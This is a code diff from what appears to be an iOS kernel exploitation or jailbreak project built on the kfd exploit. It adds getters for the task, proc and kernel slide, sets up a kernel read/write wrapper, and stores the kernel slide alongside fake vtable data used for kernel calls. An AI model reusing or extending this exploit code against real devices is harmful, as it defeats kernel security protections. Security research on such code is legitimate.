@@ -11,16 +11,63 @@
 #import "offsets.h"
 #import "sandbox.h"
 #import "ipc.h"
+#import "KernelRwWrapper.h"
 
 uint64_t _kfd = 0;
+
+uint64_t _self_task = 0;
+uint64_t _self_proc = 0;
+uint64_t _kslide = 0;
+uint64_t _kern_proc = 0;
 
 uint64_t _fake_vtable = 0;
 uint64_t _fake_client = 0;
 mach_port_t _user_client = 0;
 
+uint64_t get_selftask(void) {
+    return _self_task;
+}
+
+uint64_t get_selfproc(void) {
+    return _self_proc;
+}
+
+uint64_t get_kslide(void) {
+    return _kslide;
+}
+
+uint64_t get_kernproc(void) {
+    return _kern_proc;
+}
+
+void set_selftask(void) {
+    _self_task = ((struct kfd*)_kfd)->info.kernel.current_task;
+}
+
+void set_selfproc(void) {
+    _self_proc = ((struct kfd*)_kfd)->info.kernel.current_proc;
+}
+
+void set_kslide(void) {
+    _kslide = ((struct kfd*)_kfd)->info.kernel.kernel_slide;
+}
+
+void set_kernproc(void) {
+    _kern_proc = ((struct kfd*)_kfd)->info.kernel.kernel_proc;
+}
+
 uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
 {
     _kfd = kopen(puaf_pages, puaf_method, kread_method, kwrite_method);
+    
+    set_selftask();
+    set_selfproc();
+    set_kslide();
+    set_kernproc();
+    
+    initKernRw(get_selftask(), kread64, kwrite64);
+    printf("isKernRwReady: %d\n", isKernRwReady());
+    
     return _kfd;
 }
 
@@ -37,14 +84,6 @@ void do_kread(uint64_t kaddr, void* uaddr, uint64_t size)
 void do_kwrite(void* uaddr, uint64_t kaddr, uint64_t size)
 {
     kwrite(_kfd, uaddr, kaddr, size);
-}
-
-uint64_t get_kslide(void) {
-    return ((struct kfd*)_kfd)->info.kernel.kernel_slide;
-}
-
-uint64_t get_kernproc(void) {
-    return ((struct kfd*)_kfd)->info.kernel.kernel_proc;
 }
 
 uint8_t kread8(uint64_t where) {
@@ -264,7 +303,8 @@ int prepare_kcall(void) {
         
         NSDictionary *dictionary = @{
             @"kcall_fake_vtable": @(_fake_vtable),
-            @"kcall_fake_client": @(_fake_client)
+            @"kcall_fake_client": @(_fake_client),
+            @"kslide": @(get_kslide()),
         };
         
         BOOL success = [dictionary writeToFile:save_path atomically:YES];
